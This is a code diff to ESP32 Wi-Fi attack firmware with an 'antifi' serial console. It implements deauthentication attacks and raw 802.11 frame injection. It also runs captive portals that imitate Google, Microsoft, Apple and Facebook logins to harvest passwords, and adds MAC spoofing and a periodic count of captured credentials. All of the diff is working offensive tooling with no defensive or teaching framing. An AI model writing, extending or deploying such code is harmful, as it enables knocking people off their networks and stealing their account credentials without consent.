@@ -3,18 +3,26 @@
 #include <vector>
 
 #include "scan.h"
-#include "sender.h"
+#include "inject.h"
 #include "beacon.h"
 #include "deauth.h"
 #include "captive_portal.h"
 #include "configs.h"
 
+void stopWifi() {
+  WiFi.softAPdisconnect(true);
+  delay(100);
+  WiFi.mode(WIFI_OFF);
+  delay(100);
+}
+
 void stopAll() {
   scan_setup("stop");
   stop_beacon();
   stop_deauth();
-  senderManager.stopAllSenders();
+  injectorManager.stopAllInjectors();
   portalManager.stopPortal();
+  stopWifi();
 }
 
 // ===== Command Handlers =====
@@ -23,12 +31,11 @@ void handleDeauthCommand(String cmd) {
   int channel = 1;
   int pps = 25;
 
-  // Try parsing with different formats
   int parsed = sscanf(cmd.c_str(), "deauth -s %17s -t %17s -c %d -p %d", srcMac, tgtMac, &channel, &pps);
 
   if (parsed == 4) {
-    if (channel < 1 || channel > 14) {
-      Serial.println(F("Error: Channel must be between 1 and 14"));
+    if (channel < 1 || channel > 13) {
+      Serial.println(F("Error: Channel must be between 1 and 13"));
       return;
     }
     deauth_setup(srcMac, tgtMac, channel, pps);
@@ -39,237 +46,273 @@ void handleDeauthCommand(String cmd) {
   }
 }
 
-bool parseSendCommand(String command, String& senderName, uint8_t* packetData, uint16_t& packetLen, uint8_t& channel, uint32_t& pps, uint32_t& maxPackets) {
-  
-  // Find the space after the sender name
+bool parseInjectCommand(String command, String& injectorName, uint8_t* packetData, uint16_t& packetLen, uint8_t& channel, uint32_t& pps, uint32_t& maxPackets) {
+  // Find the space after the injector name
   int spaceIndex = command.indexOf(' ');
   if (spaceIndex == -1) {
     Serial.println("Error: Invalid command format");
-    Serial.println("Usage: send -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
+    Serial.println("Usage: inject -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
     return false;
   }
-  
-  senderName = command.substring(0, spaceIndex);
-  
-  // Verify it's a valid sender name (send followed by a number)
-  if (!senderName.startsWith("send")) {
-    Serial.println("Error: Sender name must start with 'send'");
+
+  injectorName = command.substring(0, spaceIndex);
+
+  // Verify it's a valid injector name (inject followed by a number)
+  if (!injectorName.startsWith("inject")) {
+    Serial.println("Error: Injector name must start with 'inject'");
     return false;
   }
-  
-  // Check if there's a number after "send"
-  String numberPart = senderName.substring(4);
+
+  // Check if there's a number after "inject"
+  String numberPart = injectorName.substring(6);
   if (numberPart.length() == 0) {
-    Serial.println("Error: Sender name must be 'send' followed by a number");
+    Serial.println("Error: Injector name must be 'inject' followed by a number");
     return false;
   }
-  
+
   for (char c : numberPart) {
     if (!isdigit(c)) {
-      Serial.println("Error: Sender name must be 'send' followed by a number");
+      Serial.println("Error: Injector name must be 'inject' followed by a number");
       return false;
     }
   }
-  
+
   // Now parse the rest of the command
   String restOfCommand = command.substring(spaceIndex + 1);
-  
+
   // Check for required parameters
   if (!restOfCommand.startsWith("-i ")) {
-    Serial.println("Error: Command must start with '-i' after sender name");
-    Serial.println("Usage: " + senderName + " -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
+    Serial.println("Error: Command must start with '-i' after injector name");
+    Serial.println("Usage: " + injectorName + " -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
     return false;
   }
-  
+
   // Find parameter indices
   int iIndex = 0;  // -i is at position 0 in restOfCommand
   int chIndex = restOfCommand.indexOf("-ch ");
   int ppsIndex = restOfCommand.indexOf("-pps ");
   int mIndex = restOfCommand.indexOf("-m ");
-  
+
   if (chIndex == -1 || ppsIndex == -1 || mIndex == -1) {
     Serial.println("Error: Missing required parameters (-ch, -pps, or -m)");
-    Serial.println("Usage: " + senderName + " -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
+    Serial.println("Usage: " + injectorName + " -i <frame info> -ch <channel> -pps <packets per second> -m <maximum send packets & \"non\" for no limit>");
     return false;
   }
-  
+
   // Extract packet data (hex string between -i and -ch)
   String packetDataStr = restOfCommand.substring(3, chIndex);
   packetDataStr.trim();
-  
+
   // Extract channel
   String channelStr = restOfCommand.substring(chIndex + 4, ppsIndex);
   channelStr.trim();
   channel = channelStr.toInt();
-  
+
   // Extract packets per second
   String ppsStr = restOfCommand.substring(ppsIndex + 5, mIndex);
   ppsStr.trim();
   pps = ppsStr.toInt();
-  
+
   // Extract max packets
   String maxStr = restOfCommand.substring(mIndex + 3);
   maxStr.trim();
-  maxPackets = 0; // 0 means no limit
+  maxPackets = 0;  // 0 means no limit
   if (maxStr != "non") {
     maxPackets = maxStr.toInt();
   }
-  
+
   // Validate parameters
-  if (channel < 1 || channel > 14) {
-    Serial.println("Error: Channel must be between 1 and 14");
+  if (channel < 1 || channel > 13) {
+    Serial.println("Error: Channel must be between 1 and 13");
     return false;
   }
-  
+
   if (pps == 0) {
     Serial.println("Error: Packets per second must be greater than 0");
     return false;
   }
-  
+
   if (pps > 2000) {
     Serial.println("Error: Packet rate > 2000");
     return false;
   }
-  
+
   // Convert hex string to bytes
   hexStringToBytes(packetDataStr, packetData, &packetLen);
-  
+
   if (packetLen == 0) {
     Serial.println("Error: Invalid packet data format");
     Serial.println("Make sure hex bytes are space-separated and valid");
     return false;
   }
-  
+
   if (packetLen > 512) {
     Serial.println("Error: Packet too large (max 512 bytes)");
     return false;
   }
-  
+
   return true;
 }
 
-void handleStartCommand(String command) {
-  // Remove "captive_portal" and trim
-  String params = command.substring(14);
-  params.trim();
-  
-  // Default values
-  char ssid[33] = {0};     // Max SSID length is 32
-  char pass[65] = {0};     // Max password length is 64
-  char type[20] = "wifi";  // Default type
-  
-  // Initialize with empty strings
-  ssid[0] = '\0';
-  pass[0] = '\0';
-  
-  // Parse flags
-  int sIndex = params.indexOf("-s ");
-  int pIndex = params.indexOf("-p ");
-  int tIndex = params.indexOf("-t ");
-  
-  // Extract SSID (-s flag)
-  if (sIndex != -1) {
-    int nextFlag = -1;
-    // Find the start of the next flag or end of string
-    if (pIndex > sIndex && (nextFlag == -1 || pIndex < nextFlag)) nextFlag = pIndex;
-    if (tIndex > sIndex && (nextFlag == -1 || tIndex < nextFlag)) nextFlag = tIndex;
-    
-    int startPos = sIndex + 3; // Skip "-s "
-    int endPos = (nextFlag == -1) ? params.length() : nextFlag;
-    
-    String ssidStr = params.substring(startPos, endPos);
-    ssidStr.trim();
-    
-    // Handle quoted SSID (optional)
-    if ((ssidStr.startsWith("'") && ssidStr.endsWith("'")) || 
-        (ssidStr.startsWith("\"") && ssidStr.endsWith("\""))) {
-      ssidStr = ssidStr.substring(1, ssidStr.length() - 1);
-    }
-    
-    strncpy(ssid, ssidStr.c_str(), 32);
-    ssid[32] = '\0';
-  } else {
-    Serial.println(F("Error: Missing SSID (-s flag)"));
-    Serial.println(F("Usage: captive_portal -s <SSID> [-p <password>] [-t <type>]"));
-    return;
+void parseArguments(String command) {
+  // Reset config
+  config = { "Captive Portal", "", "", "wifi", "open", false };
+
+  // Tokenize command
+  command.trim();
+  int argc = 0;
+  char* argv[20];
+  char* token = strtok((char*)command.c_str(), " ");
+
+  while (token != NULL && argc < 20) {
+    argv[argc++] = token;
+    token = strtok(NULL, " ");
   }
-  
-  // Extract password (-p flag)
-  if (pIndex != -1) {
-    int nextFlag = -1;
-    // Find the start of the next flag or end of string
-    if (sIndex > pIndex && (nextFlag == -1 || sIndex < nextFlag)) nextFlag = sIndex;
-    if (tIndex > pIndex && (nextFlag == -1 || tIndex < nextFlag)) nextFlag = tIndex;
-    
-    int startPos = pIndex + 3; // Skip "-p "
-    int endPos = (nextFlag == -1) ? params.length() : nextFlag;
-    
-    String passStr = params.substring(startPos, endPos);
-    passStr.trim();
-    
-    // Handle empty password indicators
-    if (passStr == "''" || passStr == "\"\"" || passStr == "null") {
-      pass[0] = '\0';
-    } else {
-      // Handle quoted password (optional)
-      if ((passStr.startsWith("'") && passStr.endsWith("'")) || 
-          (passStr.startsWith("\"") && passStr.endsWith("\""))) {
-        passStr = passStr.substring(1, passStr.length() - 1);
+
+  // Parse arguments
+  for (int i = 1; i < argc; i++) {
+    if (strcmp(argv[i], "-s") == 0 && i + 1 < argc) {
+      config.ssid = argv[++i];
+    } else if (strcmp(argv[i], "-m") == 0 && i + 1 < argc) {
+      config.mac = argv[++i];
+    } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
+      config.password = argv[++i];
+    } else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
+      config.portalType = argv[++i];
+    } else if (strcmp(argv[i], "-e") == 0 && i + 1 < argc) {
+      config.encryption = argv[++i];
+    } else if (strcmp(argv[i], "-v") == 0) {
+      config.verbose = true;
+    }
+  }
+}
+
+bool setMacAddress(String macStr) {
+  if (macStr.length() != 17) {
+    Serial.println("Error: MAC address must be 17 characters (XX:XX:XX:XX:XX:XX)");
+    return false;
+  }
+
+  uint8_t mac[6];
+  int values[6];
+
+  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
+             &values[0], &values[1], &values[2],
+             &values[3], &values[4], &values[5])
+      == 6) {
+    for (int i = 0; i < 6; i++) {
+      mac[i] = (uint8_t)values[i];
+    }
+
+    bool success = WiFi.softAPmacAddress(mac) == 0;
+
+    if (config.verbose) {
+      if (success) {
+        Serial.print("MAC address configured: ");
+        Serial.println(macStr);
+        uint8_t actualMac[6];
+        WiFi.softAPmacAddress(actualMac);
+        char actualMacStr[18];
+        snprintf(actualMacStr, sizeof(actualMacStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 actualMac[0], actualMac[1], actualMac[2],
+                 actualMac[3], actualMac[4], actualMac[5]);
+        Serial.print("Actual AP MAC: ");
+        Serial.println(actualMacStr);
+      } else {
+        Serial.println("Warning: MAC address may not have been set due to hardware limitations");
+        Serial.println("Some ESP32 boards don't support custom MAC addresses for AP mode");
       }
-      
-      strncpy(pass, passStr.c_str(), 64);
-      pass[64] = '\0';
+    }
+    return success;
+  }
+
+  Serial.println("Error: Invalid MAC address format. Use XX:XX:XX:XX:XX:XX");
+  return false;
+}
+
+void handleStartCommand(String command) {
+  parseArguments(command);
+
+  // Validate portal type
+  String validTypes[] = { "google", "microsoft", "apple", "facebook", "wifi" };
+  bool validType = false;
+  for (auto& type : validTypes) {
+    if (config.portalType == type) {
+      validType = true;
+      break;
     }
   }
-  
-  // Extract type (-t flag)
-  if (tIndex != -1) {
-    int nextFlag = -1;
-    // Find the start of the next flag or end of string
-    if (sIndex > tIndex && (nextFlag == -1 || sIndex < nextFlag)) nextFlag = sIndex;
-    if (pIndex > tIndex && (nextFlag == -1 || pIndex < nextFlag)) nextFlag = pIndex;
-    
-    int startPos = tIndex + 3; // Skip "-t "
-    int endPos = (nextFlag == -1) ? params.length() : nextFlag;
-    
-    String typeStr = params.substring(startPos, endPos);
-    typeStr.trim();
-    strncpy(type, typeStr.c_str(), 19);
-    type[19] = '\0';
-  }
-  
-  // Convert type to lowercase
-  for (char* p = type; *p; ++p) *p = tolower(*p);
-  
-  // Validate portal type
-  if (strcmp(type, "wifi") != 0 && strcmp(type, "google") != 0 && 
-      strcmp(type, "microsoft") != 0 && strcmp(type, "apple") != 0 && 
-      strcmp(type, "facebook") != 0) {
-    Serial.print(F("Error: Invalid portal type: "));
-    Serial.println(type);
-    Serial.println(F("Valid types: wifi, google, microsoft, apple, facebook"));
+
+  if (!validType) {
+    Serial.println("Error: Invalid portal type. Must be: google, microsoft, apple, facebook, wifi");
     return;
   }
-  
-  // Validate password length for secured networks
-  if (strlen(pass) > 0 && strlen(pass) < 8) {
-    Serial.println(F("Warning: Password should be at least 8 characters for WPA2"));
-    Serial.println(F("Using open network instead..."));
-    pass[0] = '\0';
+
+  // Validate encryption
+  String validEncryption[] = { "open", "wpa", "wpa2", "wpa3" };
+  bool validEnc = false;
+  for (auto& enc : validEncryption) {
+    if (config.encryption == enc) {
+      validEnc = true;
+      break;
+    }
   }
-  
-  Serial.println(F("Starting portal with:"));
-  Serial.print(F("  SSID: "));
-  Serial.println(ssid);
-  Serial.print(F("  Password: "));
-  Serial.println(strlen(pass) >= 8 ? "********" : "(open network)");
-  Serial.print(F("  Type: "));
-  Serial.println(type);
-  
-  if (portalManager.startPortal(ssid, pass, type)) {
-    Serial.println(F("Portal started successfully!"));
+
+  if (!validEnc) {
+    Serial.println("Error: Invalid encryption. Must be: open, wpa, wpa2, wpa3");
+    return;
+  }
+
+  // Validate password length if encryption is not open
+  if (config.encryption != "open" && config.password.length() < 8) {
+    Serial.println("Error: Password must be at least 8 characters for WPA/WPA2/WPA3 encryption");
+    return;
+  }
+
+  // Set MAC address if provided
+  if (config.mac.length() > 0) {
+    setMacAddress(config.mac);
+  }
+
+  // Print configuration
+  if (config.verbose) {
+    Serial.println("\n=== Portal Configuration ===");
+    Serial.print("SSID:        ");
+    Serial.println(config.ssid);
+    Serial.print("Portal Type: ");
+    Serial.println(config.portalType);
+    Serial.print("Encryption:  ");
+    Serial.println(config.encryption);
+    if (config.mac.length() > 0) {
+      Serial.print("MAC:         ");
+      Serial.println(config.mac);
+    }
+    if (config.password.length() > 0) {
+      Serial.print("Password:    ");
+      Serial.println(config.password);
+    }
+    Serial.println("==============================\n");
+  }
+
+  // Stop any running portal
+  if (portalManager.isRunning()) {
+    Serial.println("Stopping existing portal...");
+    portalManager.stopPortal();
+    delay(1000);
+  }
+
+  // Start the portal
+  Serial.println("Starting portal...");
+  bool success = portalManager.startPortal(config.ssid, config.password, config.portalType);
+
+  if (success) {
+    Serial.println("Portal started");
+    Serial.print("  Access via: ");
+    Serial.println(portalManager.getAPIP());
+    Serial.print("  MAC: ");
+    Serial.println(portalManager.getAPMAC());
   } else {
-    Serial.println(F("Failed to start portal. Please try again."));
+    Serial.println("Failed to start portal!");
   }
 }
 
@@ -292,6 +335,10 @@ void processCommand(String cmd) {
   if (lowerCmd == "help" || lowerCmd == "?") {
     showHelp();
   }
+  // ====== VERSION ======
+  else if (lowerCmd == "version" || lowerCmd == "v") {
+    Serial.println(version);
+  }
   // ====== SCAN AP ======
   else if (lowerCmd == "scan -t ap") {
     scan_setup("ap");
@@ -302,39 +349,38 @@ void processCommand(String cmd) {
     scan_setup("sta");
     showPrompt = false;
   }
-  // ====== SENDER ======
-  else if (lowerCmd.startsWith("send")) {
+  // ====== INJECT ======
+  else if (lowerCmd.startsWith("inject")) {
     // Initialize WiFi
     WiFi.mode(WIFI_STA);
-  
+
     // Initialize promiscuous mode
     esp_wifi_set_promiscuous(true);
 
-    String senderName;
+    String injectorName;
     uint8_t packetData[512];
     uint16_t packetLen = 0;
     uint8_t channel = 1;
     uint32_t pps = 0;
     uint32_t maxPackets = 0;
-    
-    // Use cmd instead of originalCommand
-    if (parseSendCommand(cmd, senderName, packetData, packetLen, channel, pps, maxPackets)) {
+
+    if (parseInjectCommand(cmd, injectorName, packetData, packetLen, channel, pps, maxPackets)) {
       // Display packet info before starting
-      Serial.println("\n=== Configuring Sender ===");
-      Serial.println("Name: " + senderName);
+      Serial.println("\n=== Configuring Injector ===");
+      Serial.println("Name: " + injectorName);
       Serial.println("Packet length: " + String(packetLen) + " bytes");
       Serial.println("Channel: " + String(channel));
       Serial.println("Rate: " + String(pps) + " packets/sec");
       Serial.println("Max packets: " + (maxPackets == 0 ? "Unlimited" : String(maxPackets)));
-      
-      senderManager.startSender(senderName, packetData, packetLen, channel, pps, maxPackets);
-      Serial.println("Sender " + senderName + " started successfully");
+
+      injectorManager.startInjector(injectorName, packetData, packetLen, channel, pps, maxPackets);
+      Serial.println("Injector " + injectorName + " started successfully");
       Serial.println("===========================\n");
     }
   }
-  // ====== LIST SENDERS ======
-  else if (lowerCmd == "listsenders") {
-    senderManager.listSenders();
+  // ====== LIST INJECTORS ======
+  else if (lowerCmd == "list_injectors") {
+    injectorManager.listInjectors();
   }
   // ====== DEAUTH ======
   else if (lowerCmd.startsWith("deauth")) {
@@ -349,19 +395,14 @@ void processCommand(String cmd) {
   else if (lowerCmd == "stop") {
     stopAll();
   }
-  // ====== STOP SENDER ======
+  // ====== STOP INJECTOR ======
   else if (lowerCmd.startsWith("stop -p ")) {
-    // Use cmd instead of command
-    String senderName = cmd.substring(8);
-    if (senderName == "all") {
-      senderManager.stopAllSenders();
+    String injectorName = cmd.substring(8);
+    if (injectorName == "all") {
+      injectorManager.stopAllInjectors();
     } else {
-      senderManager.stopSender(senderName);
+      injectorManager.stopInjector(injectorName);
     }
-  }
-  // ====== STATUS ======
-  else if (lowerCmd == "status") {
-    portalManager.printStatus();
   }
   // ====== CREDS ======
   else if (lowerCmd == "creds") {
@@ -370,7 +411,7 @@ void processCommand(String cmd) {
   // ====== CLEAR ======
   else if (lowerCmd == "clear") {
     portalManager.clearCredentials();
-    senderManager.clearAllSenders();
+    injectorManager.clearAllInjectors();
   }
   // ====== CAPTIVE PORTAL ======
   else if (lowerCmd.startsWith("captive_portal")) {
@@ -396,7 +437,7 @@ void handleSerialInput() {
       if (inputBuffer.length() > 0) {
         processCommand(inputBuffer);
         inputBuffer = "";
-        inputBuffer.reserve(64);  // Prevent String from growing too large
+        inputBuffer.reserve(64);
       }
     } else if (c == 8 || c == 127) {  // backspace
       if (inputBuffer.length() > 0) {
@@ -404,9 +445,28 @@ void handleSerialInput() {
         Serial.print("\b \b");
       }
     } else if (c >= 32 && c <= 126) {  // printable characters
-      // No length limitation - allow input to grow as needed
       inputBuffer += c;
       Serial.print(c);
+    }
+  }
+}
+
+void updatePortalStatus() {
+  static unsigned long lastStatusUpdate = 0;
+
+  if (millis() - lastStatusUpdate > 10000) {  // Every 10 seconds
+    lastStatusUpdate = millis();
+
+    if (portalManager.isRunning()) {
+      Serial.print("[Status] ");
+      Serial.print("SSID: ");
+      Serial.print(portalManager.getSSID());
+      Serial.print(" | Type: ");
+      Serial.print(portalManager.getPortalType());
+      Serial.print(" | Clients: ");
+      Serial.print(portalManager.getClientCount());
+      Serial.print(" | Captured: ");
+      Serial.println(portalManager.getCredentialsCaptured());
     }
   }
 }
@@ -414,25 +474,19 @@ void handleSerialInput() {
 void hexStringToBytes(String hexStr, uint8_t* bytes, uint16_t* len) {
   // Remove all spaces from hex string
   hexStr.replace(" ", "");
-  
+
   // Ensure string has even length
   if (hexStr.length() % 2 != 0) {
     *len = 0;
     return;
   }
-  
+
   *len = hexStr.length() / 2;
-  
+
   for (uint16_t i = 0; i < *len; i++) {
     String byteStr = hexStr.substring(i * 2, i * 2 + 2);
     bytes[i] = (uint8_t)strtol(byteStr.c_str(), NULL, 16);
   }
-}
-
-// ===== Memory Monitoring =====
-void printMemoryStats() {
-  Serial.print(F("Free Heap: "));
-  Serial.println(esp_get_free_heap_size());
 }
 
 // ===== Setup & Loop =====
@@ -451,7 +505,7 @@ void setup() {
   // Reserve space for input buffer to prevent fragmentation
   inputBuffer.reserve(64);
 
-  setScanDuration(600000);
+  setScanDuration(6000000);
 
   showBanner();
   Serial.print(F("antifi> "));  // Initial prompt
@@ -460,7 +514,8 @@ void setup() {
 void loop() {
   handleSerialInput();
   portalManager.update();
-  senderManager.updateSenders(currentChannel);
+  updatePortalStatus();
+  injectorManager.updateInjectors(currentChannel);
   beacon_loop();
   deauth_loop();
   scan_loop();
